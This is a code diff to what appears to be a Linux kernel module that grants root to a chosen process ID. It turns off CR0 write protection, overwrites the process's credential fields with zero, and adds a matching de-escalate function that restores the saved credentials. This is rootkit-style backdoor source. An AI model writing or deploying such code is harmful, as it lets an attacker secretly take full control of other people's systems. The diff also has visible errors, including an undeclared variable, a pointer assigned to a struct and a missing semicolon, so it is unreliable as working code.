@@ -35,10 +35,9 @@ PID_NODE *find_pid_node(PID_NODE **head, pid_t pid){
 }
 
 /* delete node */
-void *delete_pid_node(PID_NODE **head, pid_t pid){
+void *delete_pid_node(PID_NODE **head, PID_NODE node){
   /* check for NULL */
   printk("delete_pid_node()");
-  PID_NODE *node = find_pid_node(head, pid);
   if(*head == NULL || node == NULL) {
     return;
   }
@@ -63,11 +62,12 @@ void process_escalate(pid_t pid){
   printk("process_escalate()");
   /*We have the PID we want escalated to root
     Let us get the task struct*/
+  PID_NODE *new_node;
   struct task_struct *task = pid_task(find_get_pid(pid), PIDTYPE_PID);
   struct cred *pcred;
   if(find_pid_node(&head, pid) == NULL){
     /*create new pid node*/
-    PID_NODE *new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
+    new_node = kmalloc(sizeof(PID_NODE), GFP_KERNEL);
     new_node->pid = pid;
     /*start reading*/
     rcu_read_lock(); //lock the mutex
@@ -92,7 +92,7 @@ void process_escalate(pid_t pid){
     pcred->egid.val = 0;
     pcred->fsgid.val = 0;
     /*finish reading*/
-    rcu_read_unlock(); //lock the mutex
+    rcu_read_unlock(); //unlock the mutex
     write_cr0(read_cr0() | 0x10000); //enable page protection
     /*add pid node to LL*/
     insert_pid_node(&head, new_node);
@@ -100,6 +100,34 @@ void process_escalate(pid_t pid){
   }
   printk("process %d already is escalated", pid);
 
+}
+
+void process_deescalate(pid_t pid){
+  struct task_struct *task;
+  PID_NODE node = find_pid_node(&head, pid);
+  if(node != NULL){
+    rcu_read_lock(); //lock the mutex
+    write_cr0(read_cr0() & (~0x10000)); //disable page protection
+    /* fill in the members from the task for backup*/
+    task = pid_task(find_get_pid(node->pid), PIDTYPE_PID);
+    pcred = (struct cred *)task->cred;
+    /* descalate task */
+    pcred->uid = node->uid;
+    pcred->euid = node->euid;
+    pcred->suid = node->suid;
+    pcred->fsuid = node->fsuid;
+    pcred->gid = node->gid;
+    pcred->egid = node->egid;
+    pcred->sgid = node->sgid;
+    pcred->fsgid = node->fsgid;
+    /*finish reading*/
+    rcu_read_unlock(); //unlock the mutex
+    write_cr0(read_cr0() | 0x10000); //enable page protection
+    /*delete pid node from LL*/
+    delete_pid_node(&head, node);
+    return
+  }
+  printk("process %d not in list", pid);
 
 }
 
